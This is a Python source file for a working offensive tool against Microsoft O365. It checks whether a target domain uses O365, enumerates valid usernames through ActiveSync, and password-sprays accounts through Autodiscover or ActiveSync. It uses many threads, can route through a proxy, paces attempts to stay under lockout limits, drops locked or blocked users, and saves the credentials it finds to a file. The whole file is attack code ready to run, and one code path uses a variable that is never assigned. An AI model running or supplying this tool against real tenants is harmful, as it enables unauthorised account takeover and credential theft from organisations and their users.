#!/usr/bin/env python3

"""A basic username enumeration and password spraying tool aimed at spraying Microsoft O365."""

import time
import urllib3
import argparse
import concurrent.futures
import xml.etree.ElementTree as ET
from asyncio import wait, get_event_loop
from requests import get, options

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class text_colors:
    """ Colorized output during run """
    red    = "\033[91m"
    green  = "\033[92m"
    yellow = "\033[93m"
    reset  = "\033[0m"


class Helper:
    """ Helper functions """

    def print_stats(self, _type, creds, _file):
        print("\n%s\n[*] %s\n%s" % ("="*(len(_type)+4), _type, "="*(len(_type)+4)))
        print("[*] Valid Accounts: %d" % len(creds))
        if len(creds) > 0:
            print("[+] Writing data to: %s..." % _file)
            if type(creds) == dict: creds = ['%s:%s' % (k, v) for k, v in creds.items()]
            with open(_file, 'w') as f:
                for account in creds:
                    f.write("%s\n" % account)

    def get_chunks_from_list(self, _list, n):
        for i in range(0, len(_list), n):
            yield _list[i:i + n]

    def get_list_from_file(self, _file):
        with open(_file, "r") as f:
            _list = [line.strip() for line in f]
        return _list

    def check_last_chunk(self, sublist, full_list):
        """ Identify if the current list chunk is the last chunk """
        if sublist[-1] == full_list[-1]:
            return True
        return False

    def lockout_reset_wait(self, lockout):
        print("[*] Sleeping for %.1f minutes" % (lockout))
        time.sleep(lockout * 60)


class Validator:
    """ This is to validate the target domain is using O365 """

    # getuserrealm seems to be considerably faster when identifying if a domain uses O365
    default_url   = "https://login.microsoftonline.com/getuserrealm.srf?login=user@{DOMAIN}&xml=1"
    secondary_url = "https://login.microsoftonline.com/{DOMAIN}/.well-known/openid-configuration"

    def __init__(self, domain, proxy=None, debug=False, secondary=False):
        self.domain = domain
        self.url    = self.default_url if not secondary else self.secondary_url
        self.url    = self.url.format(DOMAIN=self.domain)
        self.o365   = False
        self.debug  = debug
        self.proxy  = None if not proxy else {
            "http": proxy, "https": proxy
        }

    def validate(self):
        try:
            rsp    = get(self.url, proxies=self.proxy, verify=False)
            status = rsp.status_code

            if "getuserrealm" in self.url:
                xml = ET.fromstring(rsp.text)
                nst = xml.find('NameSpaceType').text

                if nst in ["Managed", "Federated"]:
                    print("[%sVALID%s] The following domain is using O365: %s" % (text_colors.green, text_colors.reset, self.domain))
                    self.o365 = True

                else:
                    print("[%sINVALID%s] The following domain is not using O365: %s" % (text_colors.red, text_colors.reset, self.domain))

            elif "openid-configuration" in self.url:
                if status == 200:
                    print("[%sVALID%s] The following domain is using O365: %s" % (text_colors.green, text_colors.reset, self.domain))
                    self.o365 = True

                else:
                    print("[%sINVALID%s] The following domain is not using O365: %s" % (text_colors.red, text_colors.reset, self.domain))

        except Exception as e:
            if self.debug: print(e)
            pass


class Enumerator:
    """ Perform user enumeration using Microsoft Server ActiveSync """
    # Based on: https://bitbucket.org/grimhacker/office365userenum/

    loop = get_event_loop()
    url  = "https://outlook.office365.com/Microsoft-Server-ActiveSync"

    # User enumeration storage
    valid_accts = []

    def __init__(self, username_list, domain, proxy=None, debug=False, threads=10):
        self.domain  = domain
        self.debug   = debug
        self.proxy   = None if not proxy else {
            "http": proxy, "https": proxy
        }
        self.user_list = username_list
        self.helper    = Helper()
        self.executor  = concurrent.futures.ThreadPoolExecutor(max_workers=threads)

    async def run(self):
        """ Asynchronously send HTTP requests """
        futures = [self.loop.run_in_executor(
            self.executor, self.enum, user
        ) for user in self.user_list]

        await wait(futures)

    def enum(self, user):
        """ Enumerate users on Microsoft using Microsoft Server ActiveSync """
        password = "Password1"
        try:
            if '@' in user:
                if self.domain != user.split('@')[-1]:
                    user = "%s@%s" % (user.split('@')[0], self.domain)

            else:
                user = "%s@%s" % (user, self.domain)

            headers = {"MS-ASProtocolVersion": "14.0"}
            auth    = (user, password)
            rsp     = options(self.url, headers=headers, auth=auth, timeout=30, proxies=self.proxy, verify=False)

            status = rsp.status_code
            if status in [200, 401, 403]:
                print("[%s%s-%d%s] %s:%s" % (text_colors.green, "VALID_USER", status, text_colors.reset, user, password))
                self.valid_accts.append(user)

            elif status == 404 and rsp.headers.get("X-CasErrorCode") == "UserNotFound":
                print("[%s%s%s] %s:%s" % (text_colors.red, "INVALID_USER", text_colors.reset, user, password))

            else:
                print("[%s%s%s] %s:%s" % (text_colors.yellow, "UNKNOWN", text_colors.reset, user, password))

        except Exception as e:
            if self.debug: print("[ERROR] %s" % e)
            pass


class Sprayer:
    """ Perform password spraying using Microsoft Autodiscover """
    # Primary Based on:   https://github.com/sensepost/ruler/
    #                     https://github.com/byt3bl33d3r/SprayingToolkit/
    # Secondary Based on: https://bitbucket.org/grimhacker/office365userenum/

    loop = get_event_loop()

    # Autodiscover data
    primary_url   = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"
    primary_codes = {
        200: "VALID_CREDS",
        456: "FOUND_CREDS"
    }
    AADSTS_codes  = {
        # https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes
        "AADSTS50053": ["LOCKED", "Account locked"],
        "AADSTS50055": ["EXPIRED_PASS", "Password expired"],
        "AADSTS50057": ["DISABLED", "User disabled"]
    }

    # ActiveSync data
    secondary_url   = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
    secondary_codes = {
        200: "VALID_CREDS",
        403: "FOUND_CREDS"
        # 401: "BAD_PASSWD"
        # 404: "INVALID_USER"
    }

    # Password spray storage
    valid_creds = {}

    def __init__(self, username_list, domain, proxy=None, debug=False, threads=10, secondary=False):
        self.domain  = domain
        self.url     = self.primary_url if not secondary else self.secondary_url
        self.codes   = self.primary_codes if not secondary else self.secondary_codes
        self.headers = None if not secondary else {"MS-ASProtocolVersion": "14.0"}
        self.method  = get if not secondary else options
        self.debug   = debug
        self.proxy   = None if not proxy else {
            "http": proxy, "https": proxy
        }
        self.helper    = Helper()
        self.executor  = concurrent.futures.ThreadPoolExecutor(max_workers=threads)
        self.user_list = username_list

    async def run(self, password_chunk):
        """ Asynchronously send HTTP requests """
        futures = [self.loop.run_in_executor(
            self.executor, self.spray, user, password
        ) for user in self.user_list for password in password_chunk]

        await wait(futures)

    async def run_paired(self, password_list):
        """ Asynchronously send HTTP requests """
        futures = [self.loop.run_in_executor(
            self.executor, self.spray, user, password
        ) for user, password in zip(self.user_list, password_list)]

        await wait(futures)

    def spray(self, user, password):
        """ Password spray Microsoft using Microsoft Autodiscover """
        try:
            if '@' in user:
                if self.domain != user.split('@')[-1]:
                    user = "%s@%s" % (user.split('@')[0], self.domain)

            else:
                user = "%s@%s" % (user, self.domain)

            auth = (user, password)
            rsp  = self.method(self.url, headers=self.headers, auth=auth, timeout=30, proxies=self.proxy, verify=False)

            status = rsp.status_code

            if status in self.codes.keys():
                if status != 200:
                    output += " (Manually confirm [2FA, Locked, etc.])"

                print("[%s%s%s] %s:%s" % (text_colors.green, self.codes[status], text_colors.reset, user, password))
                self.valid_creds[user] = password

            else:
                err,msg = ("BAD_PASSWD", password)

                if status not in [401, 404]:
                    msg += " (Unknown Error [%s])" % status

                # Handle Autodiscover errors that are returned by the server
                if "X-AutoDiscovery-Error" in rsp.headers:
                    # Handle Basic Auth blocking - remove user from future rotations
                    if any(_str in rsp.headers.get("X-AutoDiscovery-Error") for _str in ["Basic Auth Blocked","BasicAuthBlockStatus - Deny","BlockBasicAuth - User blocked"]):
                        err = "BLOCKED"
                        msg = " Basic Auth blocked for this user. Removing from spray rotation."
                        self.user_list.remove(user)

                    else:
                        # Handle AADSTS errors - remove user from future rotations
                        for code in self.AADSTS_codes.keys():
                            if code in rsp.headers.get("X-AutoDiscovery-Error"):
                                err = self.AADSTS_codes[code][0]
                                msg = " %s. Removing from spray rotation." % self.AADSTS_codes[code][1]
                                self.user_list.remove(user)
                                break

                print("[%s%s%s] %s:%s" % (text_colors.red, err, text_colors.reset, user, msg))

        except Exception as e:
            if self.debug: print("[ERROR] %s" % e)
            pass



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Microsoft O365 User Enumerator and Password Sprayer")
    # group = parser.add_mutually_exclusive_group(required=True)
    parser.add_argument("-v", "--validate",  action="store_true", help="Validate a domain is running O365")
    parser.add_argument("-e", "--enum",      action="store_true", help="Perform username enumeration")
    parser.add_argument("-s", "--spray",     action="store_true", help="Perform password spraying")
    parser.add_argument("-d", "--domain",    type=str,   help="Domain name to validate against O365", required=True)
    parser.add_argument("-u", "--username",  type=str,   help="Username(s) delimited using commas")
    parser.add_argument("-p", "--password",  type=str,   help="Password(s) delimited using commas")
    parser.add_argument("-U", "--usernames", type=str,   help="File containing list of usernames")
    parser.add_argument("-P", "--passwords", type=str,   help="File containing list of passwords")
    parser.add_argument("-c", "--count",     type=int,   help="Number of password attempts to run before resetting lockout timer. Default: 1", default=1)
    parser.add_argument("-l", "--lockout",   type=float, help="Lockout policy reset time (in minutes). Default: 5 minutes", default=5.0)

    parser.add_argument("--proxy",   type=str, help="Proxy to pass traffic through: <ip:port>")
    parser.add_argument("--threads", type=int, help="Number of threads to run. Default: 10", default=10)
    parser.add_argument("--output",  type=str, help="Output file name for enumeration and spraying")
    parser.add_argument("--paired",  action="store_true", help="Password spray pairing usernames and passwords (1:1).")
    parser.add_argument("--debug",   action="store_true", help="Debug output")
    parser.add_argument("--spray-secondary",    action="store_true", help="Use `ActiveSync` for password spraying instead of `Autodiscover`")
    parser.add_argument("--validate-secondary", action="store_true", help="Use `openid-configuration` for domain validation instead of `getuserrealm`")

    args = parser.parse_args()

    # If enumerating users make sure we have a username or username file
    if args.enum and (not args.username and not args.usernames):
        parser.error("-u/--username or -U/--usernames is required when performing user enumeration via -e/--enum.")

    # If password spraying make sure we have username(s) and password(s)
    if args.spray and ((not args.username and not args.usernames) or (not args.password and not args.passwords)):
        parser.error("[-u/--username or -U/--usernames] and [-p/--password or -P/--passwords] are required" +
            " when performing password spraying via -s/--spray.")

    start  = time.time()
    helper = Helper()

    # Perform domain validation
    if args.validate:
        validator = Validator(args.domain, proxy=args.proxy, debug=args.debug, secondary=args.validate_secondary)
        print("[*] Performing O365 validation for: %s" % args.domain)
        validator.validate()
        # Ensure we do not perform any other function if domain is not O365
        if not validator.o365:
            (args.enum, args.spray) = (False, False)

    # Perform user enumeration
    if args.enum:
        # We chose to parse files first
        username_list = helper.get_list_from_file(args.usernames) if args.usernames else args.username.split(',')
        enum = Enumerator(username_list, domain=args.domain, proxy=args.proxy, debug=args.debug, threads=args.threads)
        print("[*] Performing user enumeration against %d potential users" % (len(username_list)))
        enum.loop.run_until_complete(enum.run())
        helper.print_stats("User Enumeration", enum.valid_accts, ("valid_users.txt" if not args.output else args.output))

    # Perform password spray
    if args.spray:
        # Use validated users if enumeration was run
        if args.enum:
            username_list = enum.valid_accts
            print("[*] Enumeration was run. Resetting lockout before password spraying.")
            helper.lockout_reset_wait(args.lockout)

        else:
            username_list = helper.get_list_from_file(args.usernames) if args.usernames else args.username.split(',')

        # Make sure we actually have users to spray (for when enum is run first)
        if len(username_list) > 0:
            password_list = helper.get_list_from_file(args.passwords) if args.passwords else args.password.split(',')

            spray = Sprayer(username_list, domain=args.domain, proxy=args.proxy, debug=args.debug, threads=args.threads, secondary=args.spray_secondary)

            print("[*] Performing password spray against %d users" % (len(username_list)))
            if not args.paired:
                for password_chunk in helper.get_chunks_from_list(password_list, args.count):
                    print("[*] Password spraying the following passwords: [%s]" % (", ".join("'%s'" % password for password in password_chunk)))
                    spray.loop.run_until_complete(spray.run(password_chunk))
                    if not helper.check_last_chunk(password_chunk, password_list):
                        helper.lockout_reset_wait(args.lockout)

            else:
                print("[*] Password spraying using paired usernames and passwords.")
                spray.loop.run_until_complete(spray.run_paired(password_list))
                # Since we are pairing usernames and passwords, we can ignore the lockout reset wait call

            helper.print_stats("Password Spraying", spray.valid_creds, ("valid_credentials.txt" if not args.output else args.output))

        else:
            if args.debug: print("\n[DEBUG] No users to run a password spray against.")

    elapsed = time.time() - start
    if args.debug: print("\n[DEBUG] %s executed in %0.2f seconds." % (__file__, elapsed))